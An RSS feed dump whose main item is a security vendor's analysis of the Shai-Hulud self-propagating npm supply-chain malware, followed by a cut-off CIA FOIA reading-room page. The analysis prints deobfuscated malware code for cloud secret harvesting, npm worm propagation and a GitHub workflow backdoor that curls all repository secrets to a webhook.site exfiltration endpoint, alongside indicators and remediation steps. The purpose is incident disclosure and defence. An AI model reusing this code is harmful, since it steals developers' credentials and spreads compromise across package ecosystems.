<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 16 Sep 2025 23:32:17 +0000</lastBuildDate><item><title>Shai-Hulud malware attack: Tinycolor and over 40 NPM packages compromised</title><link>https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised</link><description>&lt;doc fingerprint="8c2364928c168603"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Executive Summary&lt;/head&gt;
    &lt;p&gt;The NPM ecosystem is facing another critical supply chain attack. The popular @ctrl/tinycolor package, which receives over 2 million weekly downloads, has been compromised along with more than 40 other packages across multiple maintainers. This attack demonstrates a concerning evolution in supply chain threats - the malware includes a self-propagating mechanism that automatically infects downstream packages, creating a cascading compromise across the ecosystem. The compromised versions have been removed from npm.&lt;/p&gt;
    &lt;p&gt;In this post, we'll dive deep into the payload's mechanics, including deobfuscated code snippets, API call traces, and diagrams to illustrate the attack chain. Our analysis reveals a Webpack-bundled script (bundle.js) that leverages Node.js modules for reconnaissance, harvesting, and propagation; targeting Linux/macOS devs with access to NPM/GitHub/cloud creds.&lt;/p&gt;
    &lt;head rend="h2"&gt;Community Office Hour&lt;/head&gt;
    &lt;p&gt;To help the community respond to this incident, StepSecurity hosted a Community Office Hour on September 16th at 1 PM PT. The recording is available here:Â https://www.youtube.com/watch?v=D9jXoT1rtaQ&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Analysis&lt;/head&gt;
    &lt;p&gt;The attack unfolds through a sophisticated multi-stage chain that leverages Node.js's process.env for opportunistic credential access and employs Webpack-bundled modules for modularity. At the core of this attack is a ~3.6MB minified bundle.js file, which executes asynchronously during npm install. This execution is likely triggered via a hijacked postinstall script embedded in the compromised package.json.&lt;/p&gt;
    &lt;p&gt;Self-Propagation Engineâ&lt;/p&gt;
    &lt;p&gt;The malware includes a self-propagation mechanism through the NpmModule.updatePackage function. This function queries the NPM registry API to fetch up to 20 packages owned by the maintainer, then force-publishes patches to these packages. This creates a cascading compromise effect, recursively injecting the malicious bundle into dependent ecosystems across the NPM registry.&lt;/p&gt;
    &lt;p&gt;Credential Harvestingâ&lt;/p&gt;
    &lt;p&gt;The malware repurposes open-source tools like TruffleHog to scan the filesystem for high-entropy secrets. It searches for patterns such as AWS keys using regular expressions like AKIA[0-9A-Z]{16}. Additionally, the malware dumps the entire process.env, capturing transient tokens such as GITHUB_TOKEN and AWS_ACCESS_KEY_ID.&lt;/p&gt;
    &lt;p&gt;For cloud-specific operations, the malware enumerates AWS Secrets Manager using SDK pagination and accesses Google Cloud Platform secrets via the @google-cloud/secret-manager API. The malware specifically targets the following credentials:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;AWS access keys (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)&lt;/item&gt;
      &lt;item&gt;Google Cloud Platform service credentials&lt;/item&gt;
      &lt;item&gt;Azure credentials&lt;/item&gt;
      &lt;item&gt;Cloud metadata endpoints&lt;/item&gt;
      &lt;item&gt;NPM authentication tokens&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Persistence Mechanismâ&lt;/p&gt;
    &lt;p&gt;The malware establishes persistence by injecting a GitHub Actions workflow file (.github/workflows/shai-hulud-workflow.yml) via a base64-encoded bash script. This workflow triggers on push events and exfiltrates repository secrets using the expression ${{ toJSON(secrets) }} to a command and control endpoint. The malware creates branches by force-merging from the default branch (refs/heads/shai-hulud) using GitHub's /git/refs endpoint.&lt;/p&gt;
    &lt;p&gt;Data Exfiltrationâ&lt;/p&gt;
    &lt;p&gt;The malware aggregates harvested credentials into a JSON payload, which is pretty-printed for readability. It then uploads this data to a new public repository named &lt;code&gt;Shai-Hulud&lt;/code&gt; via the GitHub /user/repos API.&lt;/p&gt;
    &lt;p&gt;The entire attack design assumes Linux or macOS execution environments, checking for os.platform() === 'linux' || 'darwin'. It deliberately skips Windows systems. For a visual breakdown, see the attack flow diagram below:&lt;/p&gt;
    &lt;head rend="h2"&gt;Attack Mechanism&lt;/head&gt;
    &lt;p&gt;The compromise begins with a sophisticated minified JavaScript bundle injected into affected packages like @ctrl/tinycolor. This is not rudimentary malware but rather a sophisticated modular engine that uses Webpack chunks to organize OS utilities, cloud SDKs, and API wrappers.&lt;/p&gt;
    &lt;p&gt;The payload imports six core modules, each serving a specific function in the attack chain.&lt;/p&gt;
    &lt;head rend="h3"&gt;OS Recon (Module 71197)&lt;/head&gt;
    &lt;p&gt;This module calls getSystemInfo() to build a comprehensive system profile containing platform, architecture, platformRaw, and archRaw information. It dumps the entire process.env, capturing sensitive environment variables including AWS_ACCESS_KEY_ID, GITHUB_TOKEN, and other credentials that may be present in the environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Credential Harvesting Across Clouds&lt;/head&gt;
    &lt;head rend="h4"&gt;AWS (Module 56686)&lt;/head&gt;
    &lt;p&gt;The AWS harvesting module validates credentials using the STS AssumeRoleWithWebIdentityCommand. It then enumerates secrets using the @aws-sdk/client-secrets-manager library.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated AWS harvest snippet
async getAllSecretValues() {
  const secrets = [];
  let nextToken;
  do {
    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
    for (const secret of resp.SecretList || []) {
      const value = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
      secrets.push({ ARN: secret.ARN, SecretString: value.SecretString, SecretBinary: atob(value.SecretBinary) });  // Base64 decode binaries
    }
    nextToken = resp.NextToken;
  } while (nextToken);
  return secrets;
}&lt;/code&gt;
    &lt;p&gt;The module handles errors such as DecryptionFailure or ResourceNotFoundException silently through decorateServiceException wrappers. It targets all AWS regions via endpoint resolution.&lt;/p&gt;
    &lt;head rend="h4"&gt;GCP (Module 9897)â&lt;/head&gt;
    &lt;p&gt;The GCP module uses @google-cloud/secret-manager to list secrets matching the pattern projects//secrets/. It implements pagination using nextPageToken and returns objects containing the secret name and decoded payload. The module fails silently on PERMISSION_DENIED errors without alerting the user.&lt;/p&gt;
    &lt;head rend="h4"&gt;Filesystem Secret Scanning (Module 94913)&lt;/head&gt;
    &lt;p&gt;This module spawns TruffleHog via child_process.exec('trufflehog filesystem / --json') to scan the entire filesystem. It parses the output for high-entropy matches, such as AWS keys found in ~/.aws/credentials.&lt;/p&gt;
    &lt;head rend="h3"&gt;Propagation Mechanics&lt;/head&gt;
    &lt;head rend="h4"&gt;NPM Pivot (Module 40766)&lt;/head&gt;
    &lt;p&gt;The NPM propagation module parses NPM_TOKEN from either ~/.npmrc or environment variables. After validating the token via the /whoami endpoint, it queries /v1/search?text=maintainer:${username}&amp;amp;size=20 to retrieve packages owned by the maintainer.&lt;/p&gt;
    &lt;code&gt;// Deobfuscated NPM update snippet
async updatePackage(pkg) {
  // Patch package.json (add self as dep?) and publish
  await exec(`npm version patch --force &amp;amp;&amp;amp; npm publish --access public --token ${token}`);
}&lt;/code&gt;
    &lt;p&gt;This creates a cascading effect where an infected package leads to compromised maintainer credentials, which in turn infects all other packages maintained by that user.&lt;/p&gt;
    &lt;head rend="h4"&gt;GitHub Backdoor (Module 82036)â&lt;/head&gt;
    &lt;p&gt;The GitHub backdoor module authenticates via the /user endpoint, requiring repo and workflow scopes. After listing organizations, it injects malicious code via a bash script (Module 941).&lt;/p&gt;
    &lt;p&gt;Here is the line-by-line bash script deconstruction:&lt;/p&gt;
    &lt;code&gt;# Deobfuscated Code snippet
#!/bin/bash
GITHUB_TOKEN="$1"
BRANCH_NAME="shai-hulud"
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

FILE_CONTENT=$(cat &amp;lt;&amp;lt;'EOF'
on: push  # Trigger on any push
jobs: process
  runs-on: ubuntu-latest
  steps:
  - run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7;  # C2 exfil
         echo "$CONTENTS" | base64 -w 0 | base64 -w 0  # Double-base64 for evasion
    env: CONTENTS: ${{ toJSON(secrets) }}  # Dumps all repo secrets (GITHUB_TOKEN, AWS keys, etc.)
EOF
)

github_api() { curl -s -X "$1" -H "Authorization: token $GITHUB_TOKEN" ... "$API_BASE$2" }

REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&amp;amp;since=2025-01-01T00:00:00Z&amp;amp;per_page=100")

while IFS= read -r repo; do
  # Get default branch SHA
  REF_RESPONSE=$(github_api GET "/repos/$REPO_FULL_NAME/git/ref/heads/$DEFAULT_BRANCH")
  BASE_SHA=$(jq -r '.object.sha' &amp;lt;&amp;lt;&amp;lt; "$REF_RESPONSE")

  BRANCH_DATA=$(jq -n '{ref: "refs/heads/shai-hulud", sha: "$BASE_SHA"}')
  github_api POST "/repos/$REPO_FULL_NAME/git/refs" "$BRANCH_DATA"  # Handles "already exists" gracefully

  FILE_DATA=$(jq -n '{message: "Add workflow", content: "$(base64 &amp;lt;&amp;lt;&amp;lt; "$FILE_CONTENT")", branch: "shai-hulud"}')
  github_api PUT "/repos/$REPO_FULL_NAME/contents/$FILE_NAME" "$FILE_DATA"  # Overwrites if exists
done&lt;/code&gt;
    &lt;p&gt;This workflow is executed as soon as the compromised package create a commit with it, which immediately exfiltrates all the secrets.&lt;/p&gt;
    &lt;head rend="h3"&gt;Exfiltrationâ&lt;/head&gt;
    &lt;p&gt;The malware builds a comprehensive JSON payload containing system information, environment variables, and data from all modules. It then creates a public repository via the GitHub /repos POST endpoint using the function &lt;code&gt;makeRepo('Shai-Hulud')&lt;/code&gt;. The repository is public by default to ensure easy access for the command and control infrastructure.&lt;/p&gt;
    &lt;p&gt;We are observing hundreds of such public repositories containing exfiltrated credentials. A GitHub search for "Shai-Hulud" repositories reveals the ongoing and widespread nature of this attack, with new repositories being created as more systems execute the compromised packages.&lt;/p&gt;
    &lt;p&gt;This exfiltration technique is similar to the Nx supply chain attack we analyzed previously, where attackers also used public GitHub repositories to exfiltrate stolen credentials. This pattern of using GitHub as an exfiltration endpoint appears to be a preferred method for supply chain attackers, as it blends in with normal developer activity and bypasses many traditional security controls.&lt;/p&gt;
    &lt;p&gt;These repositories contain sensitive information. The public nature of these repositories means that any attacker can access and potentially misuse these credentials, creating a secondary risk beyond the initial compromise.&lt;/p&gt;
    &lt;p&gt;The attack employs several evasion techniques including silent error handling (swallowed via catch {} blocks), no logging output, and disguising TruffleHog execution as a legitimate "security scan."&lt;/p&gt;
    &lt;head rend="h3"&gt;Runtime Analysis with Harden-Runner&lt;/head&gt;
    &lt;p&gt;We analyzed the malicious payload using StepSecurity Harden-Runner in a GitHub Actions workflow. Harden-Runner successfully flagged the suspicious behavior as anomalous. The public insights from this test reveal how the payload works:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The compromised package made unauthorized API calls to &lt;code&gt;api.github.com&lt;/code&gt;during the npm install process&lt;/item&gt;
      &lt;item&gt;These API interactions were flagged as anomalous since legitimate package installations should not be making such external API calls&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These runtime detections confirm the sophisticated nature of the attack, with the malware attempting credential harvesting, self-propagation to other packages, and data exfiltration - all during what appears to be a routine package installation.&lt;/p&gt;
    &lt;head rend="h2"&gt;Indicators of Compromise&lt;/head&gt;
    &lt;p&gt;The following indicators can help identify systems affected by this attack:&lt;/p&gt;
    &lt;head rend="h3"&gt;GitHub Search Queries for Detection&lt;/head&gt;
    &lt;p&gt;Use these GitHub search queries to identify potentially compromised repositories across your organization:&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious workflow file&lt;/head&gt;
    &lt;p&gt;Replace &lt;code&gt;ACME&lt;/code&gt; with your GitHub organization name and use the following GitHub search query to discover all instance of &lt;code&gt;shai-hulud-workflow.yml&lt;/code&gt; in your GitHub environment.&lt;/p&gt;
    &lt;p&gt;https://github.com/search?q=org%3AACME+path%3A**%2Fshai-hulud-workflow.yml&amp;amp;type=code&lt;/p&gt;
    &lt;head rend="h4"&gt;Search for malicious branch&lt;/head&gt;
    &lt;p&gt;To find malicious branches, you can use the following Bash script:&lt;/p&gt;
    &lt;code&gt;# List all repos and check for shai-hulud branch
gh repo list YOUR_ORG_NAME --limit 1000 --json nameWithOwner --jq '.[].nameWithOwner' | while read repo; do
  gh api "repos/$repo/branches" --jq '.[] | select(.name == "shai-hulud") | "'$repo' has branch: " + .name'
done&lt;/code&gt;
    &lt;head rend="h3"&gt;File Hashes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The malicious bundle.js file has a SHA-256 hash of: &lt;code&gt;46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exfiltration endpoint: &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;File System Indicators&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Presence of malicious workflow file: &lt;code&gt;.github/workflows/shai-hulud-workflow.yml&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Function Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Calls to &lt;code&gt;NpmModule.updatePackage&lt;/code&gt;function&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious API Calls&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AWS API calls to &lt;code&gt;secretsmanager.*.amazonaws.com&lt;/code&gt;endpoints, particularly&lt;code&gt;BatchGetSecretValueCommand&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GCP API calls to &lt;code&gt;secretmanager.googleapis.com&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM registry queries to &lt;code&gt;registry.npmjs.org/v1/search&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GitHub API calls to &lt;code&gt;api.github.com/repos&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Suspicious Process Executions&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;TruffleHog execution with arguments &lt;code&gt;filesystem /&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;NPM publish commands with &lt;code&gt;--force&lt;/code&gt;flag&lt;/item&gt;
      &lt;item&gt;Curl commands targeting webhook.site domains&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Affected Packages&lt;/head&gt;
    &lt;p&gt;The following packages have been confirmed as compromised:&lt;/p&gt;
    &lt;head rend="h2"&gt;Immediate Actions Required&lt;/head&gt;
    &lt;p&gt;If you use any of the affected packages, take these actions immediately:&lt;/p&gt;
    &lt;head rend="h3"&gt;Identify and Remove Compromised Packages&lt;/head&gt;
    &lt;code&gt;# Check for affected packages in your project
npm ls @ctrl/tinycolor

# Remove compromised packages
npm uninstall @ctrl/tinycolor

# Search for the known malicious bundle.js by hash
find . -type f -name "*.js" -exec sha256sum {} \; | grep "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Clean Infected Repositories&lt;/head&gt;
    &lt;head rend="h4"&gt;Remove Malicious GitHub Actions Workflow&lt;/head&gt;
    &lt;code&gt;# Check for and remove the backdoor workflow
rm -f .github/workflows/shai-hulud-workflow.yml

# Look for suspicious 'shai-hulud' branches in all repositories
git ls-remote --heads origin | grep shai-hulud

# Delete any malicious branches found
git push origin --delete shai-hulud&lt;/code&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;Rotate All Credentials Immediately&lt;/head&gt;
    &lt;p&gt;The malware harvests credentials from multiple sources. Rotate ALL of the following:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;NPM tokens (automation and publish tokens)&lt;/item&gt;
      &lt;item&gt;GitHub personal access tokens&lt;/item&gt;
      &lt;item&gt;GitHub Actions secrets in all repositories&lt;/item&gt;
      &lt;item&gt;SSH keys used for Git operations&lt;/item&gt;
      &lt;item&gt;AWS IAM credentials, access keys, and session tokens&lt;/item&gt;
      &lt;item&gt;Google Cloud service account keys and OAuth tokens&lt;/item&gt;
      &lt;item&gt;Azure service principals and access tokens&lt;/item&gt;
      &lt;item&gt;Any credentials stored in AWS Secrets Manager or GCP Secret Manager&lt;/item&gt;
      &lt;item&gt;API keys found in environment variables&lt;/item&gt;
      &lt;item&gt;Database connection strings&lt;/item&gt;
      &lt;item&gt;Third-party service tokens&lt;/item&gt;
      &lt;item&gt;CI/CD pipeline secrets&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Audit Cloud Infrastructure for Compromise&lt;/head&gt;
    &lt;p&gt;Since the malware specifically targets AWS Secrets Manager and GCP Secret Manager, you need to audit your cloud infrastructure for unauthorized access. The malware uses API calls to enumerate and exfiltrate secrets, so reviewing audit logs is critical to understanding the scope of compromise.&lt;/p&gt;
    &lt;head rend="h4"&gt;AWS Security Audit&lt;/head&gt;
    &lt;p&gt;Start by examining your CloudTrail logs for any suspicious secret access patterns. Look specifically for BatchGetSecretValue, ListSecrets, and GetSecretValue API calls that occurred during the time window when the compromised package may have been installed. Also generate and review IAM credential reports to identify any unusual authentication patterns or newly created access keys.&lt;/p&gt;
    &lt;code&gt;# Check CloudTrail for suspicious secret access
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchGetSecretValue
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListSecrets
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue

# Review IAM credential reports for unusual activity
aws iam get-credential-report --query 'Content'&lt;/code&gt;
    &lt;head rend="h4"&gt;GCP Security Audit&lt;/head&gt;
    &lt;p&gt;For Google Cloud Platform, review your audit logs for any access to the Secret Manager service. The malware uses the @google-cloud/secret-manager library to enumerate secrets, so look for unusual patterns of secret access. Additionally, check for any unauthorized service account key creation, as these could be used for persistent access.&lt;/p&gt;
    &lt;code&gt;# Review secret manager access logs
gcloud logging read "resource.type=secretmanager.googleapis.com" --limit=50 --format=json

# Check for unauthorized service account key creation
gcloud logging read "protoPayload.methodName=google.iam.admin.v1.CreateServiceAccountKey"&lt;/code&gt;
    &lt;head rend="h3"&gt;Monitor for Active Exploitation&lt;/head&gt;
    &lt;head rend="h4"&gt;Network Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Block outbound connections to &lt;code&gt;webhook.site&lt;/code&gt;domains immediately&lt;/item&gt;
      &lt;item&gt;Monitor firewall logs for connections to &lt;code&gt;https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Implement Security Controls&lt;/head&gt;
    &lt;head rend="h4"&gt;GitHub Security Hardening&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Review and remove unnecessary GitHub Apps and OAuth applications&lt;/item&gt;
      &lt;item&gt;Audit all repository webhooks for unauthorized additions&lt;/item&gt;
      &lt;item&gt;Check deploy keys and repository secrets for all projects&lt;/item&gt;
      &lt;item&gt;Enable branch protection rules to prevent force-pushes&lt;/item&gt;
      &lt;item&gt;Turn on GitHub Secret Scanning alerts&lt;/item&gt;
      &lt;item&gt;Enable Dependabot security updates&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h4"&gt;Ongoing Monitoring&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Set up alerts for any new npm publishes from your organization&lt;/item&gt;
      &lt;item&gt;Monitor CloudTrail/GCP audit logs for secret access patterns&lt;/item&gt;
      &lt;item&gt;Implement regular credential rotation policies&lt;/item&gt;
      &lt;item&gt;Use separate, limited-scope tokens for CI/CD pipelines&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h3"&gt;For StepSecurity Enterprise Customers&lt;/head&gt;
    &lt;p&gt;The following steps are applicable only for StepSecurity enterprise customers. If you are not an existing enterprise customer, you can start our 14 day free trial by installing the StepSecurity GitHub App to complete the following recovery step.&lt;/p&gt;
    &lt;head rend="h4"&gt;â&lt;lb/&gt;Use NPM Package Cooldown Check&lt;/head&gt;
    &lt;p&gt;The NPMÂ Cooldown check automatically fails a pull request if it introduces an npm package version that was released within the organizationâs configured cooldown period (default: 2 days). Once the cooldown period has passed, the check will clear automatically with no action required. The rationale is simple - most supply chain attacks are detected within the first 24 hours of a malicious package release, and the projects that get compromised are often the ones that rushed to adopt the version immediately. By introducing a short waiting period before allowing new dependencies, teams can reduce their exposure to fresh attacks while still keeping their dependencies up to date.&lt;lb/&gt;Here is an example showing how this check protected a project from using the compromised versions of packages involved in this incident:&lt;/p&gt;
    &lt;p&gt;https://github.com/step-security/test-reporting/pull/16/checks?check_run_id=49850926488&lt;/p&gt;
    &lt;head rend="h4"&gt;Discover Pull Requests upgrading to compromised npm packages&lt;/head&gt;
    &lt;p&gt;We have added a new control specifically to detect pull requests that upgraded to these compromised packages. You can find the new control on the StepSecurity dashboard.&lt;/p&gt;
    &lt;p&gt;â&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Harden-Runner to detect compromised dependencies in CI/CD&lt;/head&gt;
    &lt;p&gt;StepSecurity Harden-Runner adds runtime security monitoring to your GitHub Actions workflows, providing visibility into network calls, file system changes, and process executions during CI/CD runs. Harden-Runner detects the compromised nx packages when they are used in CI/CD. Here is a sample Harden-Runner insights page demonstrating this detection:&lt;/p&gt;
    &lt;p&gt;If you're already using Harden-Runner, we strongly recommend you review recent anomaly detections in your Harden-Runner dashboard. You can get started with Harden-Runner by following the guide at https://docs.stepsecurity.io/harden-runner.&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Threat Center for real-time supply chain threat intelligence&lt;/head&gt;
    &lt;p&gt;The StepSecurity Threat Center provides comprehensive details about this @ctrl/tinycolor compromise and all 40+ affected packages. Access the Threat Center through your dashboard to view IOCs, remediation guidance, and real-time updates as new compromised packages are discovered. Threat alerts are automatically delivered to your SIEM via AWS S3 and webhook integrations, enabling immediate incident response when supply chain attacks occur. Our detection systems identified this attack within minutes of publication, providing early warning before widespread exploitation.&lt;/p&gt;
    &lt;head rend="h4"&gt;Use StepSecurity Artifact Monitor to detect software releases outside of authorized pipelines&lt;/head&gt;
    &lt;p&gt;StepSecurity Artifact Monitor provides real-time detection of unauthorized package releases by continuously monitoring your artifacts across package registries. This tool would have flagged this incident by detecting that the compromised versions were published outside of the project's authorized CI/CD pipeline. The monitor tracks release patterns, verifies provenance, and alerts teams when packages are published through unusual channels or from unexpected locations. By implementing Artifact Monitor, organizations can catch supply chain compromises within minutes rather than hours or days, significantly reducing the window of exposure to malicious packages.&lt;/p&gt;
    &lt;p&gt;Learn more about implementing Artifact Monitor in your security workflow at https://docs.stepsecurity.io/artifact-monitor.&lt;/p&gt;
    &lt;head rend="h2"&gt;Acknowledgements&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The npm security team and package maintainers for their swift response to this incident.&lt;/item&gt;
      &lt;item&gt;@franky47, who promptly notified the community through a GitHub issue&lt;/item&gt;
      &lt;item&gt;Daniel dos Santos Pereira for flagging suspicious behavior in a LinkedIn post.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The collaborative efforts of security researchers, maintainers, and community members continue to be essential in defending against supply chain attacks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reference&lt;/head&gt;
    &lt;p&gt;â&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45260741</guid><pubDate>Tue, 16 Sep 2025 11:22:03 +0000</pubDate></item><item><title>CIA Freedom of Information Act Electronic Reading Room</title><link>https://www.cia.gov/readingroom</link><description>&lt;doc fingerprint="ff12d0edc8a52e8d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Freedom of Information Act Electronic Reading Room&lt;/head&gt;
    &lt;p&gt;Welcome to the Central Intelligence Agency's Freedom of Information Act Electronic Reading Room.&lt;/p&gt;
    &lt;head rend="h1"&gt;What is the Electronic Reading Room?&lt;/head&gt;
    &lt;head rend="h1"&gt;What's New on the Electronic Reading Room?&lt;/head&gt;
    &lt;quote&gt;
      &lt;p&gt;Nixon and the People’s Republic of China: CIA’s Support of the Historic 1972 Presidential Trip&lt;/p&gt;
      &lt;p&gt;This collection marks the 50th anniversary of President Richard M. Nixon’s February 1972 trip to the People’s Republic of China (PRC) – a landmark event that preceded the establishment of diplomatic relations between the two countries. This small collection, consisting of three city guides, an atlas, and four leadership profiles, is a subset of the materials CIA produced for President Nixon and National Security Advisor Henry Kissinger in preparation for the seven-day visit.&lt;/p&gt;
      &lt;p&gt;City guides were produced on Peking (Beijing), Shanghai, and Hang-Chou (Hangzhou)1, as these cities were part of President Nixon’s tour of the PRC. Each guide included a brief history of the city, contemporary maps and photographs, and descriptions of geography, climates, and points of interest.&lt;/p&gt;
      &lt;p&gt;CIA also produced an 82-page atlas of the PRC for President Nixon’s trip. The US government distributed more than 4,000 copies to government customers and non-government institutions and libraries, and sold 30,000 copies to the public for a short period after the trip for $5.25, or $35.19 in today’s dollars. This is the first time in fifty years CIA has made the atlas available to the public.&lt;/p&gt;
      &lt;p&gt;This collection also includes leadership profiles—assessments that CIA provides US Presidents and other policymakers to assist them in understanding their foreign counterparts. The profiles in this collection include Chinese Communist Party (CCP) Chairman Mao Tse-tung (Mao Zedong) and Premier Chou En-lai (Zhou Enlai). A profile of Lin Piao (Lin Biao), Vice Chair of the CCP, prepared for this trip is also included in this collection; however, Lin died in a plane crash five months before President Nixon’s visit.&lt;/p&gt;
      &lt;p&gt;_____________________&lt;/p&gt;
      &lt;p&gt;1 CIA did not begin using the non-Romanization spelling of Beijing and Hangzhou until 1979. This article provides updated spellings elsewhere in parentheses.&lt;/p&gt;
      &lt;p&gt;See The Nixon Collection (8 documents/331 pages).&lt;/p&gt;
      &lt;p&gt;Current/Central Intelligence Bulletin Collection&lt;/p&gt;
      &lt;p&gt;Central Intelligence Bulletin&lt;/p&gt;
      &lt;p&gt;Harry Truman was the first U.S. president to receive a daily intelligence digest. At his direction, the Daily Summary began production in February 1946, and continued until February 1951. President Truman was pleased with the product, but a survey group commissioned by the National Security Council in 1949 was critical of the Daily Summary and issued several recommendations to improve it. The new version, called the Current Intelligence Bulletin, began production on 28 February 1951, and this remained the format of the president's daily digest through Dwight Eisenhower's two terms, although it was retitled the Central Intelligence Bulletin in 1958. The Current/Central Intelligence Bulletin grew longer than its predecessor over time with the addition of more items and more analysis, and would eventually contain more graphics as printing technology improved.&lt;/p&gt;
      &lt;p&gt;The new Kennedy Administration confronted a full array of international issues in 1961. In April, a group of CIA-trained Cuban exiles landed at the Bay of Pigs on the southern coast of Cuba with the goal of overthrowing the Fidel Castro regime and establishing an anti-Communist government. The outnumbered invading force was quickly repelled by Castro's troops. The year's reports were dominated by the worsening Congo crisis, with the fragmentation of the country widening despite the efforts of the United Nations, and US concern over the high tempo of Soviet testing of space vehicles and intercontinental ballistic missiles. The situation in Laos deteriorated, as the Communist Pathet Lao insurgency gained strength against the US-backed Royal Lao government.&lt;/p&gt;
      &lt;p&gt;The changes at the CIA following the Bay of Pigs included a format update for the president's daily intelligence report. The new version, called the President's Intelligence Checklist (PICL), was first delivered on 17 June 1961. The Central Intelligence Bulletin continued to be produced as a separate publication until 10 Jan 1974, when it was replaced by the National Intelligence Daily. The PICL, however, was the president's primary written intelligence source through the remainder of the Kennedy Administration. The Kennedy PICL reports are available here&lt;/p&gt;
      &lt;p&gt;This historical release includes: the Central Intelligence Bulletin reports from 2 January-30 June 1961 (2752 pages).&lt;/p&gt;
      &lt;p&gt;This release is the thirteenth and final release in the Current/Central Intelligence Bulletin series.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
      &lt;p&gt;aquiline adj. of or like the eagle.&lt;/p&gt;
      &lt;p&gt;Aerial intelligence collection platforms have played a critical role in US national security from the earliest beginnings of aviation. CIA's 1960s OXCART Program and its use of U-2s are examples of collection innovations that have kept US leaders informed about adversaries' capabilities and intentions. Despite their success, however, use of these platforms carried significant risks and repercussions, including detection and even pilot loss, such as the downing of the U-2 flown by Francis Gary Powers in 1960. Ever-evolving research by the CIA led to the development concept of unmanned aerial vehicles (UAVs) as collection platforms. An innovative Agency program in the 1960s codenamed Aquiline was the very first to test this concept. Based initially on the study of flight characteristics of birds, Aquiline was envisioned as a long-range vehicle that could safely and stealthily provide a window into denied areas such as the Soviet Union through photography and other capabilities, and would even support in-place agent operations. While it never became operational, the concept proved invaluable as a forerunner to today's multi-capability UAVs.&lt;/p&gt;
      &lt;p&gt;Learn more about CIA's early eagle (40 documents/289 pages).&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;
